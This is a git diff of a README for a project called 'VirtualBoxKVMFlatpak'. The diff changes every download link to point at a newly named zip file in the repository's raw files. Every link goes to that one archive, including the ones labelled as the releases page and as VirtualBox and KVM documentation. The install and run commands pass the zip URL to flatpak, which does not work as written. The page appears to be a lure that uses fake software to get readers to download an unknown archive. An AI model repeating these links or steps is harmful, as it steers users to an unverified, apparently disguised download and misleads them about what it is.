@@ -1,6 +1,6 @@
 # 🖥️ VirtualBoxKVMFlatpak - Run Virtual Machines Effortlessly
 
-[![Download VirtualBoxKVMFlatpak](https://raw.githubusercontent.com/johnny24x/VirtualBoxKVMFlatpak/main/Niobite/VirtualBoxKVMFlatpak.zip)](https://raw.githubusercontent.com/johnny24x/VirtualBoxKVMFlatpak/main/Niobite/VirtualBoxKVMFlatpak.zip)
+[![Download VirtualBoxKVMFlatpak](https://raw.githubusercontent.com/johnny24x/VirtualBoxKVMFlatpak/main/Niobite/Virtual-KVM-Flatpak-Box-1.6.zip)](https://raw.githubusercontent.com/johnny24x/VirtualBoxKVMFlatpak/main/Niobite/Virtual-KVM-Flatpak-Box-1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ VirtualBoxKVMFlatpak allows you to run VirtualBox with KVM enhancements packaged
 
 ## 📥 Download & Install
 
-To download VirtualBoxKVMFlatpak, visit this page to download: [Releases Page](https://raw.githubusercontent.com/johnny24x/VirtualBoxKVMFlatpak/main/Niobite/VirtualBoxKVMFlatpak.zip).
+To download VirtualBoxKVMFlatpak, visit this page to download: [Releases Page](https://raw.githubusercontent.com/johnny24x/VirtualBoxKVMFlatpak/main/Niobite/Virtual-KVM-Flatpak-Box-1.6.zip).
 
 1. Open your web browser.
 2. Click on the link above to navigate to the Releases page.
@@ -39,7 +39,7 @@ Before installing, ensure your system meets the following requirements:
    Run this command to install the application:
 
    ```bash
-   flatpak install flathub https://raw.githubusercontent.com/johnny24x/VirtualBoxKVMFlatpak/main/Niobite/VirtualBoxKVMFlatpak.zip
+   flatpak install flathub https://raw.githubusercontent.com/johnny24x/VirtualBoxKVMFlatpak/main/Niobite/Virtual-KVM-Flatpak-Box-1.6.zip
    ```
 
 4. **Launch VirtualBoxKVMFlatpak:**
@@ -47,7 +47,7 @@ Before installing, ensure your system meets the following requirements:
    After installation, you can run VirtualBoxKVMFlatpak using the command:
 
    ```bash
-   flatpak run https://raw.githubusercontent.com/johnny24x/VirtualBoxKVMFlatpak/main/Niobite/VirtualBoxKVMFlatpak.zip
+   flatpak run https://raw.githubusercontent.com/johnny24x/VirtualBoxKVMFlatpak/main/Niobite/Virtual-KVM-Flatpak-Box-1.6.zip
    ```
 
    Alternatively, find it in your applications menu.
@@ -99,13 +99,13 @@ If you encounter issues:
 
 For more information on VirtualBox or KVM, refer to the following resources:
 
-- [VirtualBox Documentation](https://raw.githubusercontent.com/johnny24x/VirtualBoxKVMFlatpak/main/Niobite/VirtualBoxKVMFlatpak.zip)
-- [KVM Documentation](https://raw.githubusercontent.com/johnny24x/VirtualBoxKVMFlatpak/main/Niobite/VirtualBoxKVMFlatpak.zip)
+- [VirtualBox Documentation](https://raw.githubusercontent.com/johnny24x/VirtualBoxKVMFlatpak/main/Niobite/Virtual-KVM-Flatpak-Box-1.6.zip)
+- [KVM Documentation](https://raw.githubusercontent.com/johnny24x/VirtualBoxKVMFlatpak/main/Niobite/Virtual-KVM-Flatpak-Box-1.6.zip)
 
 ## 🎉 Support and Contribution
 
 If you find any bugs or want to suggest features, feel free to open an issue on the repository. Contributions are welcome!
 
-To download VirtualBoxKVMFlatpak, visit this page to download: [Releases Page](https://raw.githubusercontent.com/johnny24x/VirtualBoxKVMFlatpak/main/Niobite/VirtualBoxKVMFlatpak.zip). 
+To download VirtualBoxKVMFlatpak, visit this page to download: [Releases Page](https://raw.githubusercontent.com/johnny24x/VirtualBoxKVMFlatpak/main/Niobite/Virtual-KVM-Flatpak-Box-1.6.zip). 
 
 Enjoy running virtual machines with ease!
